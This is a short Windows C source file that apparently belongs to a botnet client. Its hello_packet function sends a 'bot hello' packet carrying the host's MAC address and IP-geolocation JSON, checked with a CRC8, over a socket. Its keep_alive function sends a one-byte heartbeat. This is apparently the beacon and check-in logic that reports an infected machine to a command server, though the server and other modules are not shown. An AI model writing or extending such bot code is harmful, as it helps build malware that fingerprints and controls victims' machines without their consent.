#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>

#include "ICU_packet.h"
#include "crc.h"
#include "define.h"

#pragma comment(lib, "ws2_32.lib")

int hello_packet(SOCKET sock, const uint8_t* mac, const char* ipgeo_json) {
    uint16_t ipgeo_length = (uint16_t)strlen(ipgeo_json);
    uint16_t size = sizeof(HelloPacket) + ipgeo_length;

    HelloPacket pkt;
    pkt.size = size;
    pkt.version = TCP_VERSION;
    pkt.type = BOT_PACKET_HELLO_TYPE;
    memcpy(pkt.mac, mac, 6);
    pkt.ipgeo_length = ipgeo_length;

    uint8_t* buffer = malloc(size);

    memcpy(buffer, &pkt, sizeof(HelloPacket) - 1);
    memcpy(buffer + sizeof(HelloPacket) - 1, ipgeo_json, pkt.ipgeo_length);

    uint8_t crc = crc8_xor(buffer, size - 1);
    buffer[size - 1] = crc;

    int sent = send(sock, (const char*)buffer, (int)size, 0);
    free(buffer);
    return sent;
}

int keep_alive(SOCKET sock) {
    unsigned char keep_alive_packet = 0xAA;
    size_t sent = send(sock, (const char*)&keep_alive_packet, sizeof(keep_alive_packet), 0);

    return sent;
}
